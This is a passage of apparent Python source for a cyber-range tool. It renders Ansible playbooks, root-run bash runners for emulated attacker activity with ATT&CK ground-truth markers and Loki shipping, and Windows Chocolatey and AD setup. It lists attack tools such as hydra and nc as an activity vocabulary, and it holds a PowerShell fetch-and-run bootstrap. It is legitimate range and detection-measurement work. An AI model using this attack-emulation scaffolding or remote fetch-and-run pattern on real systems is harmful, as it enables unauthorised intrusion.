"""Render an Ansible playbook from a host's `install:` actions.

docs/PLANNER.md §4.3 / docs/SLICE_CONFIG.md: `config`-class provisioning is "run
an Ansible playbook"; this module produces that playbook. The first slice
supports `pkg` and `pkg@version` (the dominant kinds); `script` / `config` /
`role` / `container` are gated upstream in pass-1 (a clear EmissionError) and
will land in a fast-follow.

The playbook targets `localhost` with `connection: local` because it runs
*inside* the guest (delivered there over the qemu-guest-agent channel). It runs
as root (qemu-guest-agent exec is root), so `become: false` — no sudo needed.
"""
from __future__ import annotations

import base64
import hashlib
import io
import json
import random
import re
import textwrap
import zlib
from typing import Any

from ruamel.yaml import YAML

from axrange.ir.capabilities import install_action_kind
from axrange.ir.durations import (
    MIN_JITTER_INTERVAL_S,
    DurationParseError,
    parse_clock,
    parse_days,
    parse_duration,
)

_SUPPORTED_KINDS = {"pkg", "pkg@version"}


class ConfigRenderError(Exception):
    """An install action the config slice can't render yet."""


# ---------------------------------------------------------------------------
# OP-ACT activity rendering (inline-steps MVP — docs/SLICE_ACTIVITY.md §2/§3)
# ---------------------------------------------------------------------------

_ACTIVITY_DIR = "/var/lib/axrange/activity"
_ACT_SAFE = re.compile(r"[^a-zA-Z0-9_.-]")

# Closed v1 tool vocabulary. A step is either `{tool: <name>, target?, args?}`
# (rendered as `<name> <args> <target>`) or a `{run: <shell>}` escape. Anything
# else is a deferred error — the same way config/role/container are gated out of
# the install path. Library `behavior:`/`overrides:` never reach here (pass-1
# rejects them); the renderer only ever sees inline steps.
_ACTIVITY_TOOLS = {"nmap", "curl", "hydra", "nc", "ssh"}


class ActivityRenderError(Exception):
    """An activity step the inline-steps engine can't render."""


def activity_paths(activity_id: str) -> dict[str, str]:
    """Deterministic in-guest paths for an activity, shared by the renderer
    (embeds the marker/log) and the backend (writes/execs the runner, polls the
    marker). Keyed by `activity_id` so deploy/start/wait agree without threading
    paths through op inputs -- and so two activities on one host never collide
    (docs/SLICE_ACTIVITY.md §11.1, "multiple activities per node").

    `scheduler` is the additional seeded-jitter loop script (§11.3), written
    only when the activity's `schedule.interval` is set; one-shot/windowed-once
    activities never get one. `launch` is the tiny kill-then-start wrapper
    `start-activity` execs for a jittered activity (code-review fix,
    2026-07-10): the pkill/restart logic must live in this FILE, invoked as
    `ga.exec(vmid, ["bash", launch])`, never inlined into a `sh -lc "<pkill -f
    scheduler ...>"` string -- the invoking shell's own argv would then
    contain the `scheduler` path substring and `pkill -f <scheduler>` would
    SIGTERM the invoking shell itself before `setsid python3 <scheduler>`
    ever ran (the launcher self-kills; the scheduler never arms).
    """
    safe = _ACT_SAFE.sub("-", activity_id)
    return {
        "runner": f"{_ACTIVITY_DIR}/{safe}-runner.sh",
        "marker": f"{_ACTIVITY_DIR}/{safe}.done",
        "log": f"{_ACTIVITY_DIR}/{safe}.log",
        "scheduler": f"{_ACTIVITY_DIR}/{safe}-scheduler.py",
        "launch": f"{_ACTIVITY_DIR}/{safe}-launch.sh",
        # A4 ground-truth marker plane (docs/design/08-exercise-measurement.md):
        # a DEDICATED, APPEND-ONLY log the runner writes one `[axr-truth]` line
        # to per technique-labeled step -- kept separate from the noisy `log`
        # above so the shipper below has a clean stream, and never truncated
        # (unlike `log`, which each fire wipes) so a jittered activity's
        # markers accumulate across every fire instead of losing prior ones.
        "truth": f"{_ACTIVITY_DIR}/{safe}.truth.log",
        # The self-contained python shipper that tails `truth` and POSTs new
        # lines to Loki (LES-025 reuse: the exact shape of the sensor->Loki
        # shipper, `render_sensor_loki_shipper`, pointed at a different
        # artifact) + the tiny bash bootstrap that writes+launches it.
        "truth_shipper": f"{_ACTIVITY_DIR}/{safe}-truth-ship.py",
        "truth_ship_bootstrap": f"{_ACTIVITY_DIR}/{safe}-truth-ship.sh",
    }


def _truth_marker_escape(technique: str) -> str:
    """Escape a `technique:` value for embedding inside a DOUBLE-quoted shell
    string at RENDER time (the value is known at render/plan time -- it's IR
    content -- unlike `run`/`host`/`ts`, which the runner resolves at
    execution time). Author content is otherwise trusted opaque shell in this
    renderer, but a technique id is meant to be a short ATT&CK-style token
    (e.g. "T1059.001"), so guarding the one character (`"`) that would break
    out of the echo's quoting costs nothing and avoids a malformed marker
    line silently truncating the log."""
    return str(technique).replace("\\", "\\\\").replace('"', '\\"')


def _render_step(idx: int, step: dict[str, Any]) -> str:
    """Render one inline step to a shell line (best-effort, non-fatal): a step's
    nonzero exit is logged but does not abort the chain (recon tools routinely
    exit nonzero). Operator-authored content is trusted opaque shell, same
    stance as run-script.

    A step carrying `technique:` (A4, docs/design/08-exercise-measurement.md)
    ALSO emits one `[axr-truth]` ground-truth marker to `$TRUTH_LOG` right
    after the step runs -- unconditionally (not gated on the step's exit
    code): the marker means "this technique was ATTEMPTED at this time", which
    is true whether or not the tool itself succeeded (detection scoring cares
    about what the attacker tried, not just what worked). `run`/`host`/`ts`
    are resolved by the shell at execution time (`$RUN_ID` set once at the top
    of the runner, `$(hostname)`, `$(date -u ...)`); `technique` is baked in
    as a render-time literal (see `_truth_marker_escape`)."""
    if not isinstance(step, dict):
        raise ActivityRenderError(f"step #{idx} is not a mapping: {step!r}")

    if "run" in step:
        if "tool" in step:
            raise ActivityRenderError(
                f"step #{idx} sets both `tool` and `run`; use one"
            )
        cmd = str(step["run"])
    elif "tool" in step:
        tool = str(step["tool"])
        if tool not in _ACTIVITY_TOOLS:
            raise ActivityRenderError(
                f"step #{idx} tool {tool!r} is not in the v1 activity vocabulary "
                f"({', '.join(sorted(_ACTIVITY_TOOLS))}); use a `{{run: <shell>}}` "
                "escape for anything else"
            )
        parts = [tool]
        if step.get("args"):
            parts.append(str(step["args"]))
        if step.get("target"):
            parts.append(str(step["target"]))
        cmd = " ".join(parts)
    else:
        raise ActivityRenderError(
            f"step #{idx} has neither `tool` nor `run`: {step!r}"
        )

    n = idx + 1
    # Brace-group the (possibly compound, operator-laden) command so the LOG
    # redirect and the nonzero-exit handler apply to the WHOLE step, not just its
    # last sub-command. `{`/`}` on their own lines tolerate internal `;`/`&&` and
    # a trailing `;`. The label echo deliberately omits the raw command — echoing
    # arbitrary operator/quote content would itself need escaping; the command is
    # visible in the runner file and its output already lands in the log.
    out = (
        f'echo "[axrange] --- step {n} ---" >> "$LOG"\n'
        "{\n"
        f"{cmd}\n"
        f'}} >> "$LOG" 2>&1 || echo "[axrange] step {n} exit $?" >> "$LOG"'
    )
    technique = step.get("technique")
    if technique:
        tech = _truth_marker_escape(technique)
        out += (
            f'\necho "[axr-truth] run=$RUN_ID technique={tech} '
            'host=$(hostname) ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$TRUTH_LOG"'
        )
    return out


def render_activity_runner(steps: list[dict[str, Any]], *, activity_id: str) -> str:
    """Render an activity's inline steps to a single self-contained shell runner
    (docs/SLICE_ACTIVITY.md §3). The runner logs each step, never aborts on a
    step's nonzero exit, and `touch`es a completion marker at the end — the
    marker `wait-actor-ready` polls. One-shot: re-running re-fires the chain.

    Each EXECUTION (fire) of this script mints its own `RUN_ID` (A4, docs/
    design/08-exercise-measurement.md) -- a one-shot deploy gets one run-id, a
    re-deploy/re-fire gets a DIFFERENT one, and a jittered activity's scheduler
    (which re-invokes this SAME script per fire, `render_activity_scheduler`)
    gets a fresh run-id on every fire. This is deliberate: comparability across
    a seeded replay comes from the (activity_id, technique, host) triple
    staying IDENTICAL between runs, not from the run-id matching -- the run-id
    only needs to make each individual run's markers groupable/distinguishable
    (the replay-delta scopes its Loki query by run-id/time-range; join logic
    lives in axrange/measurement/coverage.py). `/proc/sys/kernel/random/uuid`
    is standard on any Linux guest (no new dependency); a timestamp+pid
    fallback covers the (unexpected) case it's absent.

    Raises ActivityRenderError on an unsupported step shape.
    """
    if not steps:
        raise ActivityRenderError(
            f"activity {activity_id!r} has no inline steps to render"
        )
    paths = activity_paths(activity_id)
    body = "\n".join(_render_step(i, s) for i, s in enumerate(steps))
    return (
        "#!/bin/bash\n"
        f"# axRange activity runner: {activity_id}\n"
        # No `set -e`/`set -u`: steps are best-effort and must not abort the chain
        # (recon tools exit nonzero routinely; operator `run:` content may
        # reference optional vars). Per-step failures are logged, not fatal.
        f'mkdir -p {_ACTIVITY_DIR}\n'
        f'LOG="{paths["log"]}"\n'
        f'MARKER="{paths["marker"]}"\n'
        # TRUTH_LOG is the A4 ground-truth marker stream -- APPEND-ONLY, never
        # truncated (unlike LOG below), so markers from every fire accumulate
        # (a jittered activity fires the runner repeatedly; each fire's
        # technique markers must survive the next fire's run).
        f'TRUTH_LOG="{paths["truth"]}"\n'
        'touch "$TRUTH_LOG"\n'
        'RUN_ID="$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "$(date -u +%Y%m%dT%H%M%S)-$$")"\n'
        'rm -f "$MARKER"\n'
        ': > "$LOG"\n'
        f'echo "[axrange] activity {activity_id} start run=$RUN_ID $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$LOG"\n'
        f"{body}\n"
        f'echo "[axrange] activity {activity_id} done run=$RUN_ID $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$LOG"\n'
        'touch "$MARKER"\n'
    )


# ---------------------------------------------------------------------------
# OP-ACT schedule executor -- seeded jitter (docs/SLICE_ACTIVITY.md section 11)
# ---------------------------------------------------------------------------


def activity_effective_seed(seed: Any, activity_id: str) -> int | None:
    """Fold an `Activity.seed` with its `activity_id` into a stable 32-bit RNG
    seed -- same fold shape as `render_dataset_seeder`'s `eff_seed` (LES-025
    reuse), so two jittered activities sharing a raw seed value still draw
    independent sequences. `None` when no seed is supplied: the schedule is
    then non-reproducible by design (ACT-070 warns on this at validate time).
    """
    if seed is None:
        return None
    try:
        base = int(seed)
    except (TypeError, ValueError):
        base = int(hashlib.sha256(str(seed).encode()).hexdigest()[:8], 16)
    fold = zlib.crc32(str(activity_id).encode()) & 0xFFFFFFFF
    return (base ^ fold) & 0xFFFFFFFF


def jitter_sequence(
    min_s: float, max_s: float, seed: int | None, *, count: int
) -> list[float]:
    """The deterministic sequence of fire-to-fire intervals a jittered
    activity's in-guest scheduler draws (docs/SLICE_ACTIVITY.md section 11.2)
    -- the exact `random.Random(seed).uniform(min_s, max_s)` draw order
    `render_activity_scheduler` embeds, exposed host-side so a test can
    assert "same seed -> same schedule" without executing the guest script.
    `seed=None` uses a fresh unseeded generator (a different sequence per
    call -- non-reproducible, matching the no-seed guest behavior).

    This is the LOW-LEVEL form: it takes an already-folded seed and
    already-parsed second counts. Callers that hold the raw `Activity.seed`
    and raw duration strings (e.g. A4's replay-delta) should use
    `jitter_sequence_from_activity()` instead -- passing the raw seed or a
    raw `"30s"`-style string in here directly would silently diverge from
    what the guest scheduler actually draws.
    """
    rng = random.Random(seed) if seed is not None else random.Random()
    return [rng.uniform(min_s, max_s) for _ in range(count)]


def jitter_sequence_from_activity(
    seed: Any, activity_id: str, min_spec: Any, max_spec: Any, *, count: int
) -> list[float]:
    """`jitter_sequence()` for callers holding the RAW `Activity.seed` and raw
    `schedule.interval` duration strings (e.g. `"30s"`/`"5m"`) -- folds the
    seed via `activity_effective_seed()` and parses the durations via
    `parse_duration()` internally, exactly as `render_activity_scheduler()`
    does, so a caller (A4's replay-delta) can't accidentally diverge from the
    guest's actual draw order by skipping either step."""
    eff_seed = activity_effective_seed(seed, activity_id)
    return jitter_sequence(
        parse_duration(min_spec), parse_duration(max_spec), eff_seed, count=count
    )


def activity_scheduler_path(activity_id: str) -> str:
    """Deterministic in-guest path for a jittered activity's scheduler loop."""
    return activity_paths(activity_id)["scheduler"]


def render_activity_scheduler(
    steps: list[dict[str, Any]],
    *,
    activity_id: str,
    schedule: dict[str, Any],
    seed: Any = None,
) -> str:
    """Render a jittered activity's seeded scheduler loop (docs/SLICE_ACTIVITY.md
    section 11.3): a small self-contained python3 process that, while inside
    the optional `days`/`start`/`end` window, re-runs the activity's step
    runner (the same script `render_activity_runner` produces) at
    `random.Random(seed).uniform(min, max)`-second intervals, then goes back to
    sleep. The RNG draw order matches `jitter_sequence()` exactly, so a test can
    assert the fire sequence without executing the guest script. Outside the
    window it polls in 60s increments (no busy loop) instead of firing.

    `schedule` is the resolved `{interval: {min, max}, days, start, end, once}`
    dict threaded from the IR's `Schedule` (pass1_emit); `steps` are the same
    inline steps `render_activity_runner` would render for a one-shot activity
    -- this embeds THAT rendered script (base64) so a fire byte-for-byte
    matches the one-shot path's step semantics (brace-grouped, best-effort,
    logged) rather than re-implementing them in python.

    Raises ActivityRenderError on a malformed `interval` (missing min/max, an
    unparseable duration, max < min) or an unparseable `days`/`start`/`end`.
    python3 is assumed present (the base image already relies on it for the
    seed-dataset overlay renderer).
    """
    interval = (schedule or {}).get("interval") or {}
    if not interval.get("min") or not interval.get("max"):
        raise ActivityRenderError(
            f"activity {activity_id!r}: schedule.interval requires both min "
            "and max (validator ACT-060 also enforces this)"
        )
    try:
        min_s = parse_duration(interval["min"])
        max_s = parse_duration(interval["max"])
        days = parse_days((schedule or {}).get("days"))
        start_raw = (schedule or {}).get("start")
        end_raw = (schedule or {}).get("end")
        # A window needs BOTH start and end to mean anything; one alone is
        # ignored (no time-of-day restriction) rather than an error -- the
        # day-of-week restriction (if any) still applies on its own.
        start_min = parse_clock(start_raw) if start_raw and end_raw else None
        end_min = parse_clock(end_raw) if start_raw and end_raw else None
    except DurationParseError as e:
        raise ActivityRenderError(f"activity {activity_id!r}: {e}")
    if min_s < MIN_JITTER_INTERVAL_S:
        raise ActivityRenderError(
            f"activity {activity_id!r}: schedule.interval min ({interval['min']}) "
            f"is below the {MIN_JITTER_INTERVAL_S:.0f}s floor (a near-zero interval "
            "busy-loops the guest; validator ACT-060 also enforces this)"
        )
    if max_s < min_s:
        raise ActivityRenderError(
            f"activity {activity_id!r}: schedule.interval max "
            f"({interval['max']}) < min ({interval['min']})"
        )
    # render_activity_runner already validates+renders the step payload (and is
    # the SAME script one-shot activities use); reuse it rather than
    # duplicating the step-vocabulary/brace-grouping logic (LES-025).
    runner_src = render_activity_runner(steps, activity_id=activity_id)
    paths = activity_paths(activity_id)
    eff_seed = activity_effective_seed(seed, activity_id)

    # Embed the runner as a base64 blob AND have the scheduler re-write it to
    # disk on every start (NICE-TO-HAVE #5, code review): `_deploy_behavior_
    # agent` already writes this same file once, so this is a second write of
    # identical bytes on the common path -- harmless, and deliberately kept:
    # it makes the scheduler script self-contained (a manual `bash
    # <scheduler>` restart, or a future re-arm path that skips deploy, still
    # produces a correct runner) rather than depending on deploy's write
    # having happened first. Invoked as a subprocess per fire -- keeps the
    # fire-time step semantics identical to the one-shot path instead of
    # re-implementing them in python.
    runner_b64 = base64.b64encode(runner_src.encode("utf-8")).decode("ascii")

    template = (
        "#!/usr/bin/env python3\n"
        "# axRange jittered activity scheduler: {activity_id}\n"
        "import base64, os, random, subprocess, time\n"
        "from datetime import datetime\n"
        "\n"
        "ACTIVITY_ID = {activity_id!r}\n"
        "RUNNER = {runner_path!r}\n"
        "RUNNER_B64 = {runner_b64!r}\n"
        "LOG = {log_path!r}\n"
        "DAYS = {days!r}          # None = every day; else [0=Mon..6=Sun, ...]\n"
        "START_MIN = {start_min!r}  # None = no start-of-day bound\n"
        "END_MIN = {end_min!r}\n"
        "MIN_S = {min_s!r}\n"
        "MAX_S = {max_s!r}\n"
        "SEED = {seed!r}      # None -> unseeded (non-reproducible)\n"
        "\n"
        "rng = random.Random(SEED)\n"
        "\n"
        "def in_window(now):\n"
        "    if DAYS is not None and now.weekday() not in DAYS:\n"
        "        return False\n"
        "    if START_MIN is not None and END_MIN is not None:\n"
        "        minute = now.hour * 60 + now.minute\n"
        "        if START_MIN <= END_MIN:\n"
        "            return START_MIN <= minute < END_MIN\n"
        "        # overnight window (e.g. start=22:00, end=06:00): wraps midnight.\n"
        "        return minute >= START_MIN or minute < END_MIN\n"
        "    return True\n"
        "\n"
        "def log(msg):\n"
        "    with open(LOG, 'a') as f:\n"
        "        f.write('[axrange] scheduler ' + ACTIVITY_ID + ' ' + msg + ' '\n"
        "                + datetime.now().isoformat() + chr(10))\n"
        "\n"
        "os.makedirs(os.path.dirname(RUNNER) or '.', exist_ok=True)\n"
        "with open(RUNNER, 'wb') as f:\n"
        "    f.write(base64.b64decode(RUNNER_B64))\n"
        "os.chmod(RUNNER, 0o755)\n"
        "\n"
        "log('armed pid=' + str(os.getpid()) + ' seed=' + str(SEED)\n"
        "    + ' window(days=' + str(DAYS) + ', start=' + str(START_MIN)\n"
        "    + ', end=' + str(END_MIN) + ') interval=[' + str(MIN_S) + ','\n"
        "    + str(MAX_S) + ']s')\n"
        "while True:\n"
        "    now = datetime.now()\n"
        "    if in_window(now):\n"
        "        log('fire')\n"
        "        subprocess.run(['bash', RUNNER])\n"
        "        time.sleep(rng.uniform(MIN_S, MAX_S))\n"
        "    else:\n"
        "        time.sleep(60)\n"
    )
    return template.format(
        activity_id=activity_id,
        runner_path=paths["runner"],
        runner_b64=runner_b64,
        log_path=paths["log"],
        days=days,
        start_min=start_min,
        end_min=end_min,
        min_s=min_s,
        max_s=max_s,
        seed=eff_seed,
    )


def render_activity_launch_script(activity_id: str) -> str:
    """Render the tiny bash LAUNCHER a jittered activity's `start-activity`
    execs (code-review fix, 2026-07-10 -- docs/SLICE_ACTIVITY.md §11.3): kills
    any prior scheduler instance for this activity and starts a fresh one,
    detached.

    This logic MUST live in its own file, invoked as
    `ga.exec(vmid, ["bash", <launch path>])` -- NOT inlined into a
    `sh -lc "pkill -f <scheduler path> ...; setsid python3 <scheduler path> ...&"`
    command string. If it were inlined, the INVOKING shell's own
    `/proc/<pid>/cmdline` would itself contain the `<scheduler path>`
    substring (it's part of the command text passed to `-lc`), so
    `pkill -f <scheduler path>` would match and SIGTERM that invoking shell
    before `setsid python3 <scheduler path>` ever ran -- the launcher
    self-kills, the scheduler never arms, and `wait-actor-ready`'s
    `pgrep -f <scheduler path>` times out on EVERY jittered deploy (not just a
    redo). Splitting the kill+restart logic into a FILE sidesteps this: the
    invoking argv is just `["bash", <launch path>]`, which does not contain
    the scheduler's path substring anywhere -- mirrors the
    `render_sensor_setup` precedent (`_suricata_start_block`), where the
    kill/restart logic always lives inside a written script, never inline in
    the launching `sh -lc` string.
    """
    paths = activity_paths(activity_id)
    scheduler = paths["scheduler"]
    log = paths["log"]
    return (
        "#!/bin/bash\n"
        f"# axRange activity scheduler launcher: {activity_id}\n"
        "set -u\n"
        f'pkill -f "{scheduler}" 2>/dev/null || true\n'
        "sleep 1\n"
        f'setsid python3 "{scheduler}" </dev/null >>"{log}" 2>&1 &\n'
    )


def _render_loki_tail_shipper(
    *,
    header_comment: str,
    bootstrap_comment: str,
    push_url: str,
    artifact_path: str,
    labels: dict[str, str],
    shipper_path: str,
    runner_log: str,
    unit: str,
    echo_label: str,
) -> str:
    """Shared shape for a "tail a file, POST new lines to Loki's push API"
    shipper: a self-contained python body (no Alloy/promtail dependency --
    python3 is already relied on by the config slice) plus the bash bootstrap
    that writes + (re)starts it. Used by BOTH `render_sensor_loki_shipper`
    (sensors' `export: {ship: loki}`, sensors design Phase C) and
    `render_activity_truth_shipper` (A4 ground-truth markers, docs/
    design/08-exercise-measurement.md) so the two shipping paths can't
    drift apart (LES-025 reuse -- same precedent as `_suricata_start_block`
    being shared by the two suricata-starting renderers).

    GAP-A fix (live-verified dev45 2026-07-15, docs/PRODUCT_GAPS.md): this
    bootstrap is delivered over the qemu-guest-agent exec channel, so it must
    NOT rely on `pkill -f <pattern>` or a bare `nohup ... &`:

    - a `pkill -f <pattern>` run as part of THIS bootstrap self-kills when
      the pattern is a substring of the invoking script's OWN path (e.g. a
      shipper at `.../ship-<id>.py` bootstrapped by a wrapper written to
      `.../ship-<id>.py.sh` -- `.py` is a literal substring of `.py.sh`, so
      `pkill -f '<id>.py'` matches and SIGTERMs the wrapper mid-script before
      it ever writes/launches the shipper). This bootstrap carries no pkill
      at all -- there is nothing to restart-by-killing.
    - a background `nohup ... &` is REAPED when the guest-agent exec session
      that launched it ends (proven live: only a detached transient systemd
      unit survived past the QGA call that started it). The shipper is
      instead launched as a DETACHED, deterministically-named transient
      systemd unit (`systemd-run --unit=<unit> --collect`), which survives
      the QGA exec session; `--collect` auto-reaps a previously-exited unit's
      state, and the `reset-failed`/`stop` pair ahead of it makes a re-deploy
      idempotent WITHOUT any pkill (`stop` on a not-yet-existing unit is a
      harmless no-op). `unit` MUST be stable across redeploys of the same
      shipper (so stop/reset-failed target the right instance) and unique per
      sensor/activity (so two shippers never collide) -- callers derive it
      from the same id used for `shipper_path`. The trailing
      `|| (setsid ... &)` is a fallback for a guest with no systemd (none of
      our current images lack it, but keeps the path robust); `setsid ...
      </dev/null &` detaches from the controlling session so it also
      survives QGA reaping where a systemd unit isn't available.

    Never touches the tailed file itself -- only reads NEW lines from
    wherever it currently ends when the shipper starts (`f.seek(0, 2)`), so a
    re-deploy doesn't re-ship old lines."""
    body = textwrap.dedent(f'''\
        #!/usr/bin/env python3
        # {header_comment}
        import json, os, time, urllib.request
        PUSH = {json.dumps(push_url)}
        PATH = {json.dumps(artifact_path)}
        LABELS = {json.dumps(labels)}
        def ship(lines):
            if not lines: return
            ts = str(int(time.time() * 1e9))
            data = {{"streams": [{{"stream": LABELS,
                    "values": [[ts, ln] for ln in lines]}}]}}
            req = urllib.request.Request(PUSH, data=json.dumps(data).encode(),
                    headers={{"Content-Type": "application/json"}}, method="POST")
            try: urllib.request.urlopen(req, timeout=5).read()
            except Exception: pass
        while not os.path.exists(PATH): time.sleep(1)
        with open(PATH) as f:
            f.seek(0, 2); buf = []; last = time.time()
            while True:
                ln = f.readline()
                if ln:
                    buf.append(ln.rstrip("\\n"))
                    if len(buf) >= 50: ship(buf); buf = []
                else:
                    if buf and time.time() - last > 2:
                        ship(buf); buf = []; last = time.time()
                    time.sleep(0.5)
    ''')
    return (
        "#!/bin/bash\n"
        f"# {bootstrap_comment}\n"
        "set -u\n"
        f"mkdir -p $(dirname {runner_log})\n"
        f"systemctl reset-failed {unit} 2>/dev/null || true\n"
        f"systemctl stop {unit} 2>/dev/null || true\n"
        f"cat > {shipper_path} <<'AXR_SHIP_PY'\n"
        f"{body.rstrip(chr(10))}\n"
        "AXR_SHIP_PY\n"
        f"chmod 0755 {shipper_path}\n"
        f"systemd-run --unit={unit} --collect python3 {shipper_path} >{runner_log} 2>&1 \\\n"
        f"  || (setsid python3 {shipper_path} </dev/null >{runner_log} 2>&1 &)\n"
        f'echo "[axrange] {echo_label}"\n'
    )


def render_activity_truth_shipper(activity_id: str, *, loki_url: str) -> str:
    """Render the truth-marker Loki shipper (`_render_loki_tail_shipper`) for
    one activity: tails `activity_paths()["truth"]` (the `[axr-truth]
    run=... technique=... host=... ts=...` lines `_render_step` emits) and
    ships new lines to Loki (A4, docs/design/08-exercise-measurement.md:
    "the only new stream ... reuse the Alloy pipeline / a direct push").

    TE hosts don't already run Alloy (only the standing network sensor does),
    so a direct python push using the operator-configured `LOKI_URL`
    (`AdapterConfig.loki_url` -- the SAME config `deploy-sensor`'s ship:-loki
    path already reads, no new config plumbing) is the least-new-
    infrastructure path per the work order. `run`/`technique`/`host` are NOT
    promoted to Loki stream labels (only `job`/`activity` are) -- run-id is
    high-cardinality (one per fire) and would blow up label cardinality; a
    Grafana query extracts them from the log line at query time
    (`| pattern`), same as the technique-coverage dashboard does."""
    paths = activity_paths(activity_id)
    safe = _ACT_SAFE.sub("-", activity_id)
    push_url = loki_url.rstrip("/") + "/loki/api/v1/push"
    return _render_loki_tail_shipper(
        header_comment=f"axRange activity truth->Loki shipper: {activity_id}",
        bootstrap_comment=f"axRange truth-marker Loki shipper bootstrap for activity {activity_id}",
        push_url=push_url,
        artifact_path=paths["truth"],
        labels={"job": "axr-truth", "activity": activity_id},
        shipper_path=paths["truth_shipper"],
        runner_log=f"/var/log/axrange/ship-{safe}-truth.log",
        unit=f"axr-truth-ship-{safe}",
        echo_label=f"truth shipper for {activity_id} -> {push_url}",
    )



def render_playbook(
    install_actions: list[dict[str, Any]],
    *,
    package_manager: str = "apt",
    env: dict[str, Any] | None = None,
) -> str:
    """Produce an Ansible playbook (YAML string) for the given install actions.

    On apt the play opens with a non-fatal `update_cache` task -- a cloned guest
    carries its template's stale package index, and installing against it fails
    on packages that are perfectly available (see the task comment below).

    Raises ConfigRenderError on an unsupported action kind.
    """
    module = "ansible.builtin.apt" if package_manager == "apt" else "ansible.builtin.package"

    tasks: list[dict[str, Any]] = []
    # Refresh the package index BEFORE installing anything (2026-08-14, CHANGELOG).
    #
    # A cloned guest carries whatever apt cache its TEMPLATE baked, which is as
    # old as the image. Once the distro rotates its indices, every URL in that
    # cache 404s and `state: present` fails on a package that is perfectly
    # installable -- the failure names the package, not the stale cache, so it
    # reads like a bad package list. Hit live on dev45 2026-08-13: four Debian
    # hosts failed provision-app this way, and an in-guest `apt-get update`
    # (25.7 MB) fixed all of them. LES-024 already recorded the rule ("ensure
    # update_cache first"); it was simply never implemented on THIS path.
    #
    # The shell installers (`_render_pkg_install_or_fail`, the default
    # exporter's bootstrap) always did this correctly -- `apt-get update ... ||
    # true` then a fail-loud install. This mirrors that pattern exactly rather
    # than inventing a second one: the refresh is NON-FATAL (`failed_when:
    # false`), so a guest with no egress but a genuinely usable cache still
    # installs, and the loud, specific failure stays on the install task where
    # the operator can read which package actually failed.
    #
    # apt-only: `ansible.builtin.package` (the non-apt branch) has no
    # `update_cache` parameter and would error on it.
    if package_manager == "apt" and install_actions:
        tasks.append(
            {
                "name": "refresh apt cache",
                # Deliberately NO `cache_valid_time`. It looked like a free
                # optimisation (skip the refresh if apt updated recently) and is
                # actively wrong here: it trusts apt's update-success TIMESTAMP,
                # not whether the index actually exists. Caught live on dev45
                # 2026-08-14 -- with `/var/lib/apt/lists` emptied but a recent
                # stamp, Ansible reported the refresh `ok` without doing
                # anything and the install failed on the empty index exactly as
                # before, i.e. the fix silently didn't apply. An unconditional
                # refresh costs ~5s and ~25MB once per provision-app op, which
                # is the right trade against installing off a broken index.
                module: {"update_cache": True},
                "failed_when": False,
            }
        )
    for idx, action in enumerate(install_actions):
        kind = install_action_kind(action)
        if kind not in _SUPPORTED_KINDS:
            raise ConfigRenderError(
                f"install action #{idx} kind={kind!r} is not supported by the "
                "config slice (supported: pkg, pkg@version)"
            )
        name = str(action["pkg"])
        if action.get("version"):
            name = f"{name}={action['version']}"
        tasks.append(
            {
                "name": f"install {name}",
                module: {"name": name, "state": "present"},
            }
        )

    play: dict[str, Any] = {
        "name": "axRange provision-app",
        "hosts": "localhost",
        "connection": "local",
        "become": False,  # qemu-guest-agent exec already runs as root
        "gather_facts": False,
        "tasks": tasks,
    }
    if env:
        play["environment"] = dict(env)

    yaml = YAML()
    yaml.default_flow_style = False
    buf = io.StringIO()
    yaml.dump([play], buf)
    return buf.getvalue()


_CHOCO_BOOTSTRAP = (
    "if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {\n"
    "  Set-ExecutionPolicy Bypass -Scope Process -Force\n"
    "  [System.Net.ServicePointManager]::SecurityProtocol = 3072\n"
    "  iex ((New-Object System.Net.WebClient).DownloadString("
    "'https://community.chocolatey.org/install.ps1'))\n"
    "}"
)


# Chocolatey package ids follow NuGet id conventions (letters/digits/./_/-);
# versions add +/, for build metadata / pre-release. Reject anything outside
# this charset instead of interpolating it unquoted into the install command.
_CHOCO_PKG_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]*$")
_CHOCO_VER_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._+-]*$")


def render_windows_provision(install_actions: list[dict[str, Any]]) -> str:
    """A PowerShell script installing the given pkg actions via chocolatey
    (bootstrapped on first use — needs guest egress, like apt on Linux). W1.4,
    docs/SLICE_WINDOWS_AD.md §5. Raises ConfigRenderError on an unsupported kind
    or a `pkg`/`version` outside the chocolatey id/version charset (the Linux
    path is safe via Ansible YAML; this path interpolates straight into a
    PowerShell command line, so an unvalidated value is an injection surface)."""
    lines: list[str] = ["$ErrorActionPreference='Stop'", _CHOCO_BOOTSTRAP]
    for idx, action in enumerate(install_actions):
        kind = install_action_kind(action)
        if kind not in _SUPPORTED_KINDS:
            raise ConfigRenderError(
                f"install action #{idx} kind={kind!r} is not supported by the "
                "Windows config slice (supported: pkg, pkg@version)"
            )
        name = str(action["pkg"])
        if not _CHOCO_PKG_RE.match(name):
            raise ConfigRenderError(
                f"install action #{idx} pkg={name!r} is not a valid chocolatey "
                "package id (letters/digits/./_/- only)"
            )
        ver = action.get("version")
        if ver:
            ver_s = str(ver)
            if not _CHOCO_VER_RE.match(ver_s):
                raise ConfigRenderError(
                    f"install action #{idx} version={ver_s!r} is not a valid "
                    "chocolatey version (letters/digits/./_/+/- only)"
                )
            lines.append(
                f"choco install -y --no-progress --version='{ver_s}' '{name}'"
            )
        else:
            lines.append(f"choco install -y --no-progress '{name}'")
    return "\n".join(lines) + "\n"


def netbios_from_fqdn(domain_fqdn: str) -> str:
    """Derive a NetBIOS domain name from an FQDN's first label: uppercased,
    alphanumeric/hyphen only, ≤15 chars (the same NetBIOS limit W0 enforces on
    ComputerName). `corp.local` -> `CORP`."""
    label = (domain_fqdn or "").split(".")[0]
    safe = re.sub(r"[^A-Za-z0-9-]", "", label).upper()
    return safe[:15] or "AXRANGE"


def render_windows_adds_promotion(
    domain_fqdn: str, *, safe_mode_password: str, admin_password: str,
    netbios: str | None = None,
) -> str:
    """PowerShell that promotes this Windows Server to the first DC of a new AD
    forest `domain_fqdn` (W2a `role: adds`, docs/SLICE_WINDOWS_AD.md §6.1).

    Installs the AD-DS role, sets the local Administrator password to a known
    value (so after promotion the *domain* Administrator credential is
    deterministic — what join-host-to-domain authenticates with), then
    `Install-ADDSForest` with `-NoRebootOnCompletion` so the backend drives the
